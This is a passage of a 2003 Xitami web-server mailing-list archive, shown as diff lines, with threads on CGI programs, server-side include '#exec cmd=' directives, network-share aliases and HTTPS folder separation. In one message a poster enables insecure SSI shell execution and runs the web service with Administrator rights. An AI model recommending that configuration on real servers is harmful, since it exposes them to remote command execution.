+If so, how can I get aroung it.
+
+Does anyone have any suggestions?
+
+Thanks!
+
+From xitami@lists.xitami.org  Wed Dec 10 07:24:19 2003
+From: xitami@lists.xitami.org (Marc Doigny)
+Date: Wed, 10 Dec 2003 08:24:19 +0100
+Subject: [Xitami] #exec cmd= in Win XP
+In-Reply-To: <Law10-OE34v6GWLAWhM00007267@hotmail.com>
+References: <20031204001702.4785.69689.Mailman@sxpublic.imatix.net>
+Message-ID: <5.1.0.14.2.20031210081338.02d75950@verfaillie4.verfaillie.local>
+
+At 21:28 9/12/03, "Charles Duval" <ch_duval@hotmail.com> wrote:
+
+>I am trying to use a CGI to copy content on one directory to another on my
+>Web server to update information on a ramdisk.
+
+[...]
+
+- Through a compiled CGI program.
+
+I have a whole ordering system running as executable (more than 100 
+executables), never had this sort of problem. I'm using w2k and am not sure 
+if it's related with XP.
+Do you succeed executing other sorts of executables? Maybe you are getting 
+a time-out from Xitami?
+
+One error that comes to my mind (and occur quite frequently), is that if 
+you use DOS commands from within your executable, you must run them as 
+argument of the CMD statement. That is because Xitami starts your 
+executable directly, and there is no command interpreter available.
+
+Please include the source code of your program (if it's some kind of widely 
+used language) so we can debug it.
+
+I can compile you a small executable that will do the job and/or display 
+status information as HTTP output (why the copy was not done). Specify 
+exactly what the executable must do. Mail me personally marc@verfaillie.be 
+if interested. i'll also include the correct Xitami settings to use.
+
+Some general info about Xitami and windows executables: 
+http://web.verfaillie.com/webserver
+
+Marc
+
+
+--::Mailserver Verfaillie Bauwens::-- contact [postmaster@verfaillie.com]
+Alle mails gecontroleerd op virussen. Virusdefinities dagelijks aangepast.
+http://www.verfaillie.com
+
+From xitami@lists.xitami.org  Wed Dec 10 19:31:39 2003
+From: xitami@lists.xitami.org (Pieter Hintjens)
+Date: Wed, 10 Dec 2003 20:31:39 +0100
+Subject: [Xitami] #exec cmd= in Win XP
+In-Reply-To: <Law10-OE34v6GWLAWhM00007267@hotmail.com>
+Message-ID: <3FD782AB.11541.1ABEAC0D@localhost>
+
+"Charles Duval" <ch_duval@hotmail.com> wrote:
+
+> I am trying to use a CGI to copy content on one directory to another
+> on my Web server to update information on a ramdisk...
+
+There are many potential problems, the trick is to solve them one by 
+one.
+
+Start with the simplest CGI you can make (like testcgi) and make sure 
+that works.
+
+Now add functionality, step by step, testing each time.
+
+It is probably something simple: from your description, I guess the 
+executable CGI assumes something (like current directory) that is not 
+correct when running under Xitami.  Try running the CGI by hand from 
+the Xitami directory, and check the Xitami configuration with respect 
+to the CGI working directory.
+
+-
+Pieter Hintjens
+iMatix Corporation
+
+
+
+From xitami@lists.xitami.org  Wed Dec 10 19:31:39 2003
+From: xitami@lists.xitami.org (Pieter Hintjens)
+Date: Wed, 10 Dec 2003 20:31:39 +0100
+Subject: [Xitami] #exec cmd= in Win XP
+In-Reply-To: <5.1.0.14.2.20031210081338.02d75950@verfaillie4.verfaillie.local>
+References: <Law10-OE34v6GWLAWhM00007267@hotmail.com>
+Message-ID: <3FD782AB.32337.1ABEABEF@localhost>
+
+Marc Doigny <marc@verfaillie.be> wrote:
+
+> I have a whole ordering system running as executable (more than 100
+> executables), never had this sort of problem...
+
+Maybe you would be interested in the WTP (web transaction protocol) 
+that is included in Xitami 2.5?
+
+WTP is a simple but very efficient transaction processing monitor 
+that lets you write large database applications to run under Xitami.  
+More sophisticated than LRWP, much more efficient than CGI, only for  
+C applications at present.
+
+http://www.sms-at.com/wtp/smsat is an example application (you will 
+need a Belgian GSM number to register and use it, unfortunately).
+
+You will find WTP, related tools (such as fdlgen/fmlgen) and sample 
+applications in the Studio directory of the Xitami source packages.
+
+-
+Pieter Hintjens
+iMatix Corporation
+
+
+
+From xitami@lists.xitami.org  Wed Dec 10 19:58:48 2003
+From: xitami@lists.xitami.org (Jason Ozin at Technica Solutions)
+Date: Wed, 10 Dec 2003 19:58:48 -0000
+Subject: [Xitami] Bug report - 2.5c1
+In-Reply-To: <3FD782AB.11541.1ABEAC0D@localhost>
+Message-ID: <VPOP32.0.0h.20031210195848.665.275.1.b4eea9b9@mail.ozin.com>
+
+I have had to downgrade once more to 2.4d10 as 2.5c1 was bringing my servers
+to their knees. Every 48 hours or so the server was reporting i/o errors on
+many services using TCP/IP ports and Xitami was refusing to run CGI programs
+and php refusing to shell to external exes. Stopping Xitami and restarting
+solved the problem each time.
+
+
+Jason Ozin
+Technica Solutions
+
+
+From xitami@lists.xitami.org  Thu Dec 11 07:05:16 2003
+From: xitami@lists.xitami.org (Marc Doigny)
+Date: Thu, 11 Dec 2003 08:05:16 +0100
+Subject: [Xitami] #exec cmd= in Win XP
+In-Reply-To: <3FD782AB.32337.1ABEABEF@localhost>
+References: <5.1.0.14.2.20031210081338.02d75950@verfaillie4.verfaillie.local>
+ <Law10-OE34v6GWLAWhM00007267@hotmail.com>
+Message-ID: <5.1.0.14.2.20031211080314.0232b660@verfaillie4.verfaillie.local>
+
+At 20:31 10/12/03, "Pieter Hintjens" <ph@imatix.com> wrote:
+>Marc Doigny <marc@verfaillie.be> wrote:
+>
+>
+>http://www.sms-at.com/wtp/smsat is an example application (you will
+>need a Belgian GSM number to register and use it, unfortunately).
+
+I'm from Belgium ....be
+and own a gsm
+Your name sounds very Dutch too ...
+
+I'll try it.
+
+Marc
+
+
+--::Mailserver Verfaillie Bauwens::-- contact [postmaster@verfaillie.com]
+Alle mails gecontroleerd op virussen. Virusdefinities dagelijks aangepast.
+http://www.verfaillie.com
+
+From xitami@lists.xitami.org  Thu Dec 11 10:07:25 2003
+From: xitami@lists.xitami.org (Dijk, P.C. van (Piet))
+Date: Thu, 11 Dec 2003 11:07:25 +0100
+Subject: [Xitami] [Alias]
+Message-ID: <7D30D5D3C525994CAD6C6A1C40B788B25C22@chasca.domaina.int.net>
+
+This message is in MIME format. Since your mail reader does not understand
+this format, some or all of this message may not be legible.
+
+------_=_NextPart_001_01C3BFCE.9375F930
+Content-Type: text/plain;
+	charset="iso-8859-1"
+
+Hello all,
+
+I have a question about de [Alias] section in defaults.cfg
+If I point to a folder on the local harddisc everything is ok.
+
+Is there a way to point to a folder on an other server?
+
+UNC-path doesn't seem to work (\\server\sharedfoldername or
+//server/sharedfoldername)
+Drive mapping doesn't work either.
+Drive mapping did work on my former server (NT4) with xitami 2.4d9.
+On my current server (W2K) runs xitami 2.5d1 as a service
+
+Thanks in advance for your reaction!
+Kind regards,
+
+Piet van Dijk
+
+____________________________________________
+P.C. van Dijk
+FCDF Corporate Research
+Deventer
+the Netherlands
+
+"The information contained in this message and its attachments is intended
+only for the use of the addressee, you may not use, copy or disclose to
+anyone any information contained in the message and its attachments. If you
+received the message in error, please advise the sender immediately and
+destroy or delete the message. E-mail transmission cannot be guaranteed to
+be secure or error free as information could be intercepted, corrupted,
+lost, destroyed, arrive late or incomplete, or contain viruses. The sender
+therefore does not accept liability for any errors or omissions in the
+content of this message which arise as a result of e-mail transmission. If
+verification is required please request a hard copy version."
+
+"De informatie verzonden met dit e-mail bericht en de bijlagen is
+uitsluitend bestemd voor de geadresseerde(n). Gebruik van deze informatie
+door anderen dan de geadresseerde(n) is verboden. Indien u dit e-mail
+bericht bij vergissing heeft ontvangen, wilt u dan de verzender onmiddellijk
+waarschuwen en het bericht vernietigen. Het gebruik van e-mail is niet
+gegarandeerd veilig of foutloos; informatie kan worden onderschept, verminkt
+of verloren gaan; kan te laat of incompleet binnenkomen of virussen
+bevatten. Om deze reden neemt de verzender geen enkele verantwoordelijkheid
+voor fouten of wijzigingen in de inhoud van dit bericht als gevolg van het
+versturen via e-mail. Bij twijfel verzoeken wij u een kopie op te vragen."
+
+
+------_=_NextPart_001_01C3BFCE.9375F930
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html; =
+charset=3Diso-8859-1">
+<META NAME=3D"Generator" CONTENT=3D"MS Exchange Server version =
+5.5.2653.12">
+<TITLE>[Alias]</TITLE>
+</HEAD>
+<BODY>
+
+<P><FONT SIZE=3D2>Hello all,</FONT>
+</P>
+
+<P><FONT SIZE=3D2>I have a question about de [Alias] section in =
+defaults.cfg</FONT>
+<BR><FONT SIZE=3D2>If I point to a folder on the local harddisc =
+everything is ok.</FONT>
+</P>
+
+<P><FONT SIZE=3D2>Is there a way to point to a folder on an other =
+server?</FONT>
+</P>
+
+<P><FONT SIZE=3D2>UNC-path doesn't seem to work =
+(\\server\sharedfoldername or //server/sharedfoldername)</FONT>
+<BR><FONT SIZE=3D2>Drive mapping doesn't work either.</FONT>
+<BR><FONT SIZE=3D2>Drive mapping did work on my former server (NT4) =
+with xitami 2.4d9.</FONT>
+<BR><FONT SIZE=3D2>On my current server (W2K) runs xitami 2.5d1 as a =
+service</FONT>
+</P>
+
+<P><FONT SIZE=3D2>Thanks in advance for your reaction!</FONT>
+<BR><FONT SIZE=3D2>Kind regards,</FONT>
+</P>
+
+<P><FONT SIZE=3D2>Piet van Dijk</FONT>
+</P>
+
+<P><FONT SIZE=3D2>____________________________________________</FONT>
+<BR><FONT SIZE=3D2>P.C. van Dijk</FONT>
+<BR><FONT SIZE=3D2>FCDF Corporate Research</FONT>
+<BR><FONT SIZE=3D2>Deventer</FONT>
+<BR><FONT SIZE=3D2>the Netherlands</FONT>
+</P>
+
+<P><FONT SIZE=3D1>&quot;The information contained in this message and =
+its attachments is intended only for the use of the addressee, you may =
+not use, copy or disclose to anyone any information contained in the =
+message and its attachments. If you received the message in error, =
+please advise the sender immediately and destroy or delete the message. =
+E-mail transmission cannot be guaranteed to be secure or error free as =
+information could be intercepted, corrupted, lost, destroyed, arrive =
+late or incomplete, or contain viruses. The sender therefore does not =
+accept liability for any errors or omissions in the content of this =
+message which arise as a result of e-mail transmission. If verification =
+is required please request a hard copy version.&quot;</FONT></P>
+
+<P><FONT SIZE=3D1>&quot;De informatie verzonden met dit e-mail bericht =
+en de bijlagen is uitsluitend bestemd voor de geadresseerde(n). Gebruik =
+van deze informatie door anderen dan de geadresseerde(n) is verboden. =
+Indien u dit e-mail bericht bij vergissing heeft ontvangen, wilt u dan =
+de verzender onmiddellijk waarschuwen en het bericht vernietigen. Het =
+gebruik van e-mail is niet gegarandeerd veilig of foutloos; informatie =
+kan worden onderschept, verminkt of verloren gaan; kan te laat of =
+incompleet binnenkomen of virussen bevatten. Om deze reden neemt de =
+verzender geen enkele verantwoordelijkheid voor fouten of wijzigingen =
+in de inhoud van dit bericht als gevolg van het versturen via e-mail. =
+Bij twijfel verzoeken wij u een kopie op te vragen.&quot;</FONT></P>
+
+</BODY>
+</HTML>
+------_=_NextPart_001_01C3BFCE.9375F930--
+
+From xitami@lists.xitami.org  Thu Dec 11 10:11:20 2003
+From: xitami@lists.xitami.org (Marc Doigny)
+Date: Thu, 11 Dec 2003 11:11:20 +0100
+Subject: [Xitami] [Alias]
+In-Reply-To: <7D30D5D3C525994CAD6C6A1C40B788B25C22@chasca.domaina.int.ne
+ t>
+Message-ID: <5.1.0.14.2.20031211110923.023a0ec0@verfaillie4.verfaillie.local>
+
+At 11:07 11/12/03, "Dijk, P.C. van (Piet)" <pc.vandijk@fcdf.nl> wrote:
+
+UNC-path doesn't seem to work (\\server\sharedfoldername or 
+//server/sharedfoldername)
+>Drive mapping doesn't work either.
+>Drive mapping did work on my former server (NT4) with xitami 2.4d9.
+>On my current server (W2K) runs xitami 2.5d1 as a service
+
+That is because Xitami runs as LOCAL SYSTEM and has no access to external 
+shares.
+Create a new account with limited rights (but with access to the shares) 
+and run Xitami as this account.
+
+
+--::Mailserver Verfaillie Bauwens::-- contact [postmaster@verfaillie.com]
+Alle mails gecontroleerd op virussen. Virusdefinities dagelijks aangepast.
+http://www.verfaillie.com
+
+From xitami@lists.xitami.org  Thu Dec 11 10:34:49 2003
+From: xitami@lists.xitami.org (Dijk, P.C. van (Piet))
+Date: Thu, 11 Dec 2003 11:34:49 +0100
+Subject: [Xitami] [Alias]
+Message-ID: <7D30D5D3C525994CAD6C6A1C40B788B25C23@chasca.domaina.int.net>
+
+This message is in MIME format. Since your mail reader does not understand
+this format, some or all of this message may not be legible.
+
+------_=_NextPart_001_01C3BFD2.6738CC10
+Content-Type: text/plain;
+	charset="iso-8859-1"
+
+Wow - were you waiting for my question : )
+You're right. (I should have known this..)
+It works fine now!
+Thank you very much Marc.
+
+----------------------------------------------------------------------
+
+At 11:07 11/12/03, "Dijk, P.C. van (Piet)" <pc.vandijk@fcdf.nl> wrote:
+
+UNC-path doesn't seem to work (\\server\sharedfoldername or 
+//server/sharedfoldername)
+>Drive mapping doesn't work either.
+>Drive mapping did work on my former server (NT4) with xitami 2.4d9.
+>On my current server (W2K) runs xitami 2.5d1 as a service
+
+That is because Xitami runs as LOCAL SYSTEM and has no access to external 
+shares.
+Create a new account with limited rights (but with access to the shares) 
+and run Xitami as this account.
+
+"The information contained in this message and its attachments is intended
+only for the use of the addressee, you may not use, copy or disclose to
+anyone any information contained in the message and its attachments. If you
+received the message in error, please advise the sender immediately and
+destroy or delete the message. E-mail transmission cannot be guaranteed to
+be secure or error free as information could be intercepted, corrupted,
+lost, destroyed, arrive late or incomplete, or contain viruses. The sender
+therefore does not accept liability for any errors or omissions in the
+content of this message which arise as a result of e-mail transmission. If
+verification is required please request a hard copy version."
+
+"De informatie verzonden met dit e-mail bericht en de bijlagen is
+uitsluitend bestemd voor de geadresseerde(n). Gebruik van deze informatie
+door anderen dan de geadresseerde(n) is verboden. Indien u dit e-mail
+bericht bij vergissing heeft ontvangen, wilt u dan de verzender onmiddellijk
+waarschuwen en het bericht vernietigen. Het gebruik van e-mail is niet
+gegarandeerd veilig of foutloos; informatie kan worden onderschept, verminkt
+of verloren gaan; kan te laat of incompleet binnenkomen of virussen
+bevatten. Om deze reden neemt de verzender geen enkele verantwoordelijkheid
+voor fouten of wijzigingen in de inhoud van dit bericht als gevolg van het
+versturen via e-mail. Bij twijfel verzoeken wij u een kopie op te vragen."
+
+
+------_=_NextPart_001_01C3BFD2.6738CC10
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html; =
+charset=3Diso-8859-1">
+<META NAME=3D"Generator" CONTENT=3D"MS Exchange Server version =
+5.5.2653.12">
+<TITLE>RE: [Xitami] [Alias]</TITLE>
+</HEAD>
+<BODY>
+
+<P><FONT SIZE=3D2>Wow - were you waiting for my question : )</FONT>
+<BR><FONT SIZE=3D2>You're right. (I should have known this..)</FONT>
+<BR><FONT SIZE=3D2>It works fine now!</FONT>
+<BR><FONT SIZE=3D2>Thank you very much Marc.</FONT>
+</P>
+
+<P><FONT =
+SIZE=3D2>---------------------------------------------------------------=
+-------</FONT>
+</P>
+
+<P><FONT SIZE=3D2>At 11:07 11/12/03, &quot;Dijk, P.C. van (Piet)&quot; =
+&lt;pc.vandijk@fcdf.nl&gt; wrote:</FONT>
+</P>
+
+<P><FONT SIZE=3D2>UNC-path doesn't seem to work =
+(\\server\sharedfoldername or </FONT>
+<BR><FONT SIZE=3D2>//server/sharedfoldername)</FONT>
+<BR><FONT SIZE=3D2>&gt;Drive mapping doesn't work either.</FONT>
+<BR><FONT SIZE=3D2>&gt;Drive mapping did work on my former server (NT4) =
+with xitami 2.4d9.</FONT>
+<BR><FONT SIZE=3D2>&gt;On my current server (W2K) runs xitami 2.5d1 as =
+a service</FONT>
+</P>
+
+<P><FONT SIZE=3D2>That is because Xitami runs as LOCAL SYSTEM and has =
+no access to external </FONT>
+<BR><FONT SIZE=3D2>shares.</FONT>
+<BR><FONT SIZE=3D2>Create a new account with limited rights (but with =
+access to the shares) </FONT>
+<BR><FONT SIZE=3D2>and run Xitami as this account.</FONT>
+</P>
+
+<P><FONT SIZE=3D1>&quot;The information contained in this message and =
+its attachments is intended only for the use of the addressee, you may =
+not use, copy or disclose to anyone any information contained in the =
+message and its attachments. If you received the message in error, =
+please advise the sender immediately and destroy or delete the message. =
+E-mail transmission cannot be guaranteed to be secure or error free as =
+information could be intercepted, corrupted, lost, destroyed, arrive =
+late or incomplete, or contain viruses. The sender therefore does not =
+accept liability for any errors or omissions in the content of this =
+message which arise as a result of e-mail transmission. If verification =
+is required please request a hard copy version.&quot;</FONT></P>
+
+<P><FONT SIZE=3D1>&quot;De informatie verzonden met dit e-mail bericht =
+en de bijlagen is uitsluitend bestemd voor de geadresseerde(n). Gebruik =
+van deze informatie door anderen dan de geadresseerde(n) is verboden. =
+Indien u dit e-mail bericht bij vergissing heeft ontvangen, wilt u dan =
+de verzender onmiddellijk waarschuwen en het bericht vernietigen. Het =
+gebruik van e-mail is niet gegarandeerd veilig of foutloos; informatie =
+kan worden onderschept, verminkt of verloren gaan; kan te laat of =
+incompleet binnenkomen of virussen bevatten. Om deze reden neemt de =
+verzender geen enkele verantwoordelijkheid voor fouten of wijzigingen =
+in de inhoud van dit bericht als gevolg van het versturen via e-mail. =
+Bij twijfel verzoeken wij u een kopie op te vragen.&quot;</FONT></P>
+
+</BODY>
+</HTML>
+------_=_NextPart_001_01C3BFD2.6738CC10--
+
+From xitami@lists.xitami.org  Thu Dec 11 19:03:08 2003
+From: xitami@lists.xitami.org (Charles Duval)
+Date: Thu, 11 Dec 2003 14:03:08 -0500
+Subject: [Xitami] #exec cmd= in Win XP
+References: <20031204001702.4785.69689.Mailman@sxpublic.imatix.net> <5.1.0.14.2.20031210081338.02d75950@verfaillie4.verfaillie.local>
+Message-ID: <LAW10-OE50rmibfvTqP00001d91@hotmail.com>
+
+At 21:28 9/12/03, "Charles Duval" <ch_duval@hotmail.com> wrote:
+
+>I am trying to use a CGI to copy content on one directory to another on my
+>Web server to update information on a ramdisk.
+
+[...]
+
+Thanks for all the input guys!
+
+Marc asked for the source code of my program.  It's in RapidQ Basic:
+        $APPTYPE CGI
+        $INCLUDE "Rapidq.inc"
+
+        Print "Copying Files to RamDisk !<br>"
+        Print "Please Wait.<br>"
+        shell "c:\windows\system32\xcopy.exe d:\xitami\toramdsk\*.* r:\ /e
+/y /h /d"
+        print "FINISHED<br>"
+
+I don't think I can be more specific than what is there.  All drive letters
+are specified and all.  Whatever I do, I get the following result and the
+copy command does not execute:
+
+        Copying Files to RamDisk !
+        Please Wait.
+        FINISHED
+
+Running the CGI by hand in the cgi-bin directory from command line works
+fine. The copied files are listed between "Please Wait" and "FINISHED" as
+expected.
+
+
+
+Charles
+
+From xitami@lists.xitami.org  Thu Dec 11 20:09:09 2003
+From: xitami@lists.xitami.org (Marc Doigny)
+Date: Thu, 11 Dec 2003 21:09:09 +0100
+Subject: [Xitami] #exec cmd= in Win XP
+In-Reply-To: <LAW10-OE50rmibfvTqP00001d91@hotmail.com>
+References: <20031204001702.4785.69689.Mailman@sxpublic.imatix.net>
+ <5.1.0.14.2.20031210081338.02d75950@verfaillie4.verfaillie.local>
+Message-ID: <6.0.0.14.0.20031211201851.02796380@mail.verfaillie.com>
+
+At 20:03 11/12/03, "Charles Duval" <ch_duval@hotmail.com> wrote:
+
+To begin with, just create a simple executable that displays the time.
+If it can do that, you can go further.
+
+
+
+>        shell "c:\windows\system32\xcopy.exe d:\xitami\toramdsk\*.* r:\ /e
+>/y /h /d"
+
+tmp$ = ENVIRON$("TEMP")      to locate the temp directory.
+                              You can also hard-code it.
+cmd$ = ENVIRON$("COMSPEC")   to locate the command interpreter directory
+SHELL cmd$ + " /c c:\windows\system32\xcopy .... >>" + tmp$ + "\xxx.tmp"
+
+Xitami evokes executables in the console subsystem (an empty space), while 
+running a program from the command prompt actually runs the program as an 
+argument of the command interpreter (that is, the command interpreter is 
+always available in command prompt mode)
+
+You have to specify where the output goes.
+Simply printing it to screen won't work - Xitami does not display a console 
+screen, it can even cause your application to fail, waiting for a screen to 
+print to that never is available.
+
+fileout$ = ENVIRON$("CGI_STDOUT") that's the file Xitami is expecting
+DIM file AS QFileStream
+File.Open(fileout$, fmOpenWrite)
+File.Write("<html><body>Copying files to Ramdisk<pre>")
+
+Now add the content of tmp$ + "\xxx.tmp" to the output stream (don't know 
+how to do that in this dialect)
+Seems you can only have one stream open at any given moment.
+
+
+and terminate:
+File.Write("</pre>FINISHED</body></html>")
+File.Close
+
+Basically, Xitami is just a fileserver. Whenever a user request a page, 
+Xitami delivers it using the correct protocols. When the requested page is 
+a CGI,
+    Xitami sets some environment variables,
+    calls the application,
+    waits for it to terminate,
+    send the generated output (a file) to the user.
+
+RapidQ is an interpreted language, meaning it's not well suited for cgi 
+applications.
+Each time your application is started, it must be compiled before execution.
+Not very important for desktop applications (these applications are only 
+started once a day and the user can wait some seconds), but of great 
+importance if you have a web site that relies on cgi.
+
+
+
+
+From xitami@lists.xitami.org  Thu Dec 11 22:27:48 2003
+From: xitami@lists.xitami.org (Ferenc-Jan)
+Date: Thu, 11 Dec 2003 23:27:48 +0100
+Subject: [Xitami] http folder must differ from https folder - how?!
+Message-ID: <3FD8FD74.4600.1BDC2E32@localhost>
+
+Hi there!
+
+I'd like to [have a friend] use Xitami/Pro to serve up some stuff 
+over https.
+
+I find myself going completely bonkers over this one: how to divide 
+between the HTTP content and the HTTPS content? Nothing I found stops 
+Xitami from happily serving up the sensitive stuff over HTTP _as well 
+as_ over HTTPS!  :-/
+
+In other words: I want to serve from two subfolders in /webpages: 
+/http & /https, Xitami chosing between the two, based on the protocol 
+use by the client.
+
+Must be some incongruity between Xitami's and my philosophy (I find 
+it completely trivial in apache.) Surely this is some simple option I 
+overlooked in the online docs?
+
+regards & cheers anyway - for a great httpserver
+
+Ferenc
+
+From xitami@lists.xitami.org  Fri Dec 12 22:01:35 2003
+From: xitami@lists.xitami.org (Charles Duval)
+Date: Fri, 12 Dec 2003 17:01:35 -0500
+Subject: [Xitami] #exec cmd= in Win XP
+References: <20031204001702.4785.69689.Mailman@sxpublic.imatix.net> <5.1.0.14.2.20031210081338.02d75950@verfaillie4.verfaillie.local> <6.0.0.14.0.20031211201851.02796380@mail.verfaillie.com>
+Message-ID: <Law10-OE24uwXNtgEel0000a70f@hotmail.com>
+
+For those following this topic, here's more.
+Thank you to those who have given me advices, but we're not there yet.
+
+1) #exec cmd=
+On my system (Windows XP), Xitami  (ver 2.5b5) is installed as a Service.
+In XP, when you do that, the service runs as LocalService and uses
+permissions attributed to Local Services which are limited.  When you set an
+Environment Variable (like ssi_insecure) in the Administrator account for
+example, it won't be set in the LocalService account, so Xitami won't see
+it.
+
+So... I was trying to run a "#exec cmd=" SSIs, but in LocalService, the
+SSI_INSECURE was not set to YES: it did not exist.  I changed the rights of
+the Xitami Service so it now runs with the Administrator rights.  Now I can
+read SSI_INSECURE=YES in the environment variables through a CGI called by
+Xitami.  Even there, I have not been able to run anything through #exec cmd=
+even something as simple as :
+
+<!--#exec cmd="cmd /c set"-->
+or <!--#exec cmd="c:\test.exe"-->  (a simple HelloWorld application that
+runs fine as a CGI)...
+It should work, shouldn't it???
+
+2) CGI stand alone.
+I want to use XCOPY to copy the content of one directory on a hard disk to a
+ramdisk through a CGI that run simply by typing
+http://myServerAddress/cgi-bin/copy2ramdsk" in a browser (or by clicking on
+an Hyperlink).
+
+Someone wrote that I had to use the DOS "CMD" command 'cause it needs the
+command line interpreter. But this is not a command line.  It's an .EXE
+located in \windows\system32.  The "DIR" command won't work without "CMD",
+but xcopy should (I tryed the cmd command anyways - with our without quotes,
+but it didn't work).  All the other stuff works:
+cmd /c dir c:\
+cmd /c copy c:\test\*.* r:\
+cmd /c copy \?
+cmd c:\xitami\cgi-bin\testcgi.exe
+
+Maybe it's just XCOPY that does not allow this. :-(
+
+About RapidQ basic, I know that it's not the best, but I don't use it for
+heavy CGI jobs : it's my "fast testing" software and it's much faster than
+my regular C compiler.  It has a CGI switch that compiles (in bytecode) in o
+ne pass and the output of the "compiled" application is sent to the stdio
+like a regular C application (not the screen).  And it's free !  I use C++
+for the real-life stuff.
+
+From xitami@lists.xitami.org  Sun Dec 14 19:28:01 2003
+From: xitami@lists.xitami.org (Pieter Hintjens)
+Date: Sun, 14 Dec 2003 20:28:01 +0100
+Subject: [Xitami] http folder must differ from https folder - how?!
+In-Reply-To: <3FD8FD74.4600.1BDC2E32@localhost>
+Message-ID: <3FDCC7D1.24785.2F54C7B8@localhost>
+
+"Ferenc-Jan" <ferenc@avz.xs4all.nl> wrote:
+
+> In other words: I want to serve from two subfolders in /webpages:
+> /http & /https, Xitami chosing between the two, based on the protocol
+> use by the client.
+
+Xitami/Pro does not allow this separation per protocol, but it does 
+let you do much the same thing using virtual hosts.  Since HTTPS is 
+bound to an IP address, not a server name, use the default 
+configuration for your secure information.  Then add a virtual host 
+for your insecure data.
+
+When people come in on the secure connection they will use the 
+default configuration.  When people use the insecure connection they 
+will use the virtual host configuration.
+
+There is one flaw in this plan: if someone enters the IP address they 
+will be sent to the secure data.  This may or may not be a problem 
+for you, since HTTPS is not protecting your data so much as allowing 
+your users be certain it is coming from you.
+
+There may be other ways to do this, and there are certainly ways to 
+make more complex access controls using scripts (which can check and 
+switch the HTTP protocol between secure and insecure).
+
+-
+Pieter Hintjens
+iMatix Corporation
+
+
+
+From xitami@lists.xitami.org  Mon Dec 15 03:19:10 2003
+From: xitami@lists.xitami.org (Justin Fielke)
+Date: Mon, 15 Dec 2003 13:19:10 +1000
+Subject: [Xitami] VB CGI problem
+Message-ID: <8ED32F51BA71144695D9927DDA124CAD025B62@mipelasrv1.mipela.local>
+
+This is a multi-part message in MIME format.
+
+------_=_NextPart_001_01C3C2BA.34C09DD0
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+Hi there,
+=20
+I have just recently updated an intranet server from using Xitami V2.4 =
+to V2.5.
+I have found that my VB cgi exe files are no longer running and just =
+return
+=20
+There is a problem with the page you are trying to reach and it cannot =
+be displayed.=09
+
+
+HTTP 500 - Internal server error=20
+Internet Explorer=20
+
+Has there been any changes from to 2.4d9 to 2.5c1 that might effect the =
+setup of CGI
+=20
+my defaults.cfg file includes:
+=20
+[Cgi]
+    Timeout=3D500
+=20
+[Server]
+    Cgi-bin=3DX:/Projects/Line1/cgi-bin
+    Portbase=3D8000
+    Priority=3D3
+    Recover=3D1
+    Webpages=3DX:/Projects/Line1
+
+I have also noticed that the folder and file icons are missing in the =
+xitami directory listings.=20
+This indicates to me that xitami is not quite seeing the directory paths =
+the same as before.
+=20
+The path to the xitami exe on this server are X:/Projects/Line1/Xitami
+=20
+Thanks
+Justin
+=20
+=20
+
+------_=_NextPart_001_01C3C2BA.34C09DD0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html; =
+charset=3Diso-8859-1">
+
+
+<META content=3D"MSHTML 6.00.2800.1170" name=3DGENERATOR></HEAD>
+<BODY>
+<DIV><FONT face=3DArial size=3D2>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial size=3D2>Hi=20
+there,</FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial=20
+size=3D2></FONT></SPAN>&nbsp;</DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial size=3D2>I have =
+just recently=20
+updated an intranet server from using Xitami V2.4 to =
+V2.5.</FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial size=3D2>I have =
+found that my=20
+VB cgi exe files are no longer running and just =
+return</FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial=20
+size=3D2></FONT></SPAN>&nbsp;</DIV>
+<DIV><SPAN class=3D265473701-15122003>
+<TABLE cellSpacing=3D5 cellPadding=3D3 width=3D400>
+  <TBODY>
+  <TR>
+    <TD id=3DtablePropsWidth width=3D400 colSpan=3D2><FONT=20
+      style=3D"FONT: 8pt/11pt verdana; COLOR: black">There is a problem =
+with the=20
+      page you are trying to reach and it cannot be =
+displayed.</FONT></TD></TR>
+  <TR>
+    <TD id=3DtablePropsWidth width=3D400 colSpan=3D2><FONT id=3DLID1=20
+      style=3D"FONT: 8pt/11pt verdana; COLOR: black">
+      <H2 id=3Dietext style=3D"FONT: 8pt/11pt verdana; COLOR: =
+black">HTTP 500 -=20
+      Internal server error <BR>Internet Explorer=20
+</H2></FONT></TD></TR></TBODY></TABLE></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial size=3D2>Has =
+there been any=20
+changes from to 2.4d9 to 2.5c1 that might effect the setup of=20
+CGI</FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial=20
+size=3D2></FONT></SPAN>&nbsp;</DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial size=3D2>my =
+defaults.cfg file=20
+includes:</FONT></SPAN></DIV>
+<DIV>&nbsp;</DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial=20
+size=3D2>[Cgi]<BR>&nbsp;&nbsp;&nbsp; Timeout=3D500</FONT></SPAN></DIV>
+<DIV>&nbsp;</DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial=20
+size=3D2>[Server]<BR>&nbsp;&nbsp;&nbsp;=20
+Cgi-bin=3DX:/Projects/Line1/cgi-bin<BR>&nbsp;&nbsp;&nbsp;=20
